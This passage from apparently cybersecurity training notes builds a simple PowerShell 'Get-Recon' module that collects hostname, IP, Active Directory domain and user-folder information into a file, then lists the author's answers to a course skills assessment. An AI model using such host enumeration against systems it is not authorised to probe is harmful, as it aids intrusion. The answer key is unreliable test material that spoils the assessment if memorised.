This function performs some simple recon tasks for the user. We import the module and then issue the 'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for your understanding. Right now, this only works on the local host from which you run it, and the output will be sent to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions coming soon!  

.Example  
After importing the module run "Get-Recon"
'Get-Recon


    Directory: C:\Users\MTanaka\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                        
----                 -------------         ------ ----                                                                                                                                        
-a----         11/3/2022  12:46 PM              0 recon.txt '

.Notes  
Remote Recon functions coming soon! This script serves as our initial introduction to writing functions and scripts and making PowerShell modules.  

#>
function Get-Recon {  
    # Collect the hostname of our PC
    $Hostname = $env:ComputerName  
    # Collect the IP configuration
    $IP = ipconfig
    # Collect basic domain information
    $Domain = Get-ADDomain 
    # Output the users who have logged in and built out a basic directory structure in "C:\Users"
    $Users = Get-ChildItem C:\Users\
    # Create a new file to place our recon results in
    new-Item ~\Desktop\recon.txt -ItemType File 
    # A variable to hold the results of our other variables 
    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
    # It does the thing 
    Add-Content ~\Desktop\recon.txt $Vars
  } 

Export-ModuleMember -Function Get-Recon -Variable Hostname 
```

And there we have it, our full module file. Our use of Comment-based help, functions, variables and content protection makes for a dynamic and clear-to-read script. From here we can save this file in our Module directory we created and import it from within PowerShell for use.

#### Importing the Module For Use

  PowerShell Scripting and Automation

```powershell-session
PS C:\htb> Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1`

PS C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
Script     0.0        quick-recon                         Get-Recon
```

Perfect. We can see that our module was imported using the `Import-Module` cmdlet, and to ensure it was loaded into our session, we ran the `Get-Module` cmdlet. It has shown us that our module `quick-recon` was imported and has the command `Get-Recon` that could be exported. We can also test the Comment-based help by trying to run `Get-Help` against our module.

#### Help Validation

  PowerShell Scripting and Automation

```powershell-session
PS C:\htb> get-help get-recon

NAME
    Get-Recon

SYNOPSIS


SYNTAX
    Get-Recon [<CommonParameters>]


DESCRIPTION
    This function performs some simple recon tasks for the user. We simply import the module and then issue the
    'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for
    your understanding. Right now, this only works on the local host from which you run it, and the output will be sent
    to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions coming soon!


RELATED LINKS

REMARKS
    To see the examples, type: "get-help Get-Recon -examples."
    For more information, type: "get-help Get-Recon -detailed."
    For technical information, type: "get-help Get-Recon -full."
```

Our help works as well. So we now have a fully functioning module for our use. We can use this as a basis for anything we build further and could even modify this one to encompass more reconnaissance functions in the future.

---

This was a simple example of what can be done from an automation perspective with PowerShell, but a great way to see it built and in use. We can use module building and scripting to our advantage and simplify our processes as we go. Saving time ultimately enables us to do more as operators and spend time on other tasks that need our attention. If you would like a copy of the quick-recon module for your use, there is a copy saved in the `Resources` of this module at the top right corner of any section page.

---
# Skills Assessment

Q1 - answer in banner
Q2 - txt file in Desktop
Q3 - hostname(amswer)
Q4 - TRee
Q5 - `gci -Recurse -File | ? { $_.Length -gt 0 }`
Q6 - Net User
Q7 - Systeminfo
Q8 - Get-Module "Module name"
Q9 - Get-ADUser -Filter 'Surname -eq "Flag"' -Properties GivenName
Q10 - tasklist | sort /R | findstr /I "^vm"
Q11 -  ssh to domain controller > ps.1 > Get-WinEvent -MaxEvents 10 -FilterHashTable @{LogName=‘Security’;ID=‘4625’} | fl
